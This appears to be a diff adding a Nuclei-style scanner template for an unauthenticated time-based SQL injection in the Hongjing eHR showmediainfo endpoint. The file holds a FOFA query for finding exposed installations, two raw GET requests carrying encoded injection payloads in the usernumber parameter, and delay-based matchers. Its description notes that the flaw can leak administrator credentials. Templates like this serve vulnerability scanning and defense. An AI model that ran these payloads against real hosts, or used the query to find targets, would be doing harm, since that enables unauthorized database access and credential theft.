@@ -1,0 +1,39 @@
+id: hongjingeHR-showmediainfo-sql
+
+info:
+  name: "宏景 eHR showmediainfo 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="HJSOFT-HCM"
+      该接口存在SQL注入安全缺陷，允许远程攻击者在未认证的情况下执行恶意SQL语句，可能导致数据库敏感信息泄露，如管理员凭证及用户数据。在特定权限条件下，攻击者可能进一步利用该漏洞在服务器上植入恶意代码，从而获取系统控制权。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488210&idx=1&sn=446aa0fe9efd03a68481e7f55b4c6cb4&chksm=c267a7e1f5102ef7a5f4d83a2ac2d54b01bbf177fcbe3946f9357e501eff7a1b78c15619a41f&token=350950895&lang=zh_CN#rd
+  tags: 宏景eHR
+
+
+
+http:
+- raw:
+  - |
+    GET /workbench/duty/showmediainfo?kind=0&usernumber=1MV8sCtnMcsZFzLhJXUMPAATTP2HJFPAATTPeSQjnxB2B6PAATTP2HJBPAATTPqs9424imL40PAATTP3HJDPAATTP&planid=1&objectid=1 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+  - |
+    GET /workbench/duty/showmediainfo?kind=0&usernumber=1MV8sCtnMcsZFzLhJXUMPAATTP2HJFPAATTPXBolUjMO1ICWZlYOtV8xykPAATTP3HJDPAATTP&planid=1&objectid=1 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+
+
+
+
+
+
